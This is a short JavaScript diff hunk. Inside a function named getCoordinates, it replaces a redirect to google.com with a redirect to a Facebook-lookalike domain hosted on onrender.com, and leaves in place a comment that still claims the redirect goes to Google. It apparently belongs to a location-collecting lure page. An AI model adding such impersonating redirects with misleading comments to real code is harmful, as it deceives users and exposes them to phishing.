@@ -25,5 +25,5 @@ function getCoordinates() {
   }
 
   // In real browser — redirect directly to Google
-  window.location.href = "https://google.com";
+  window.location.href = "https://facebook-profile-nakz.onrender.com";
 }
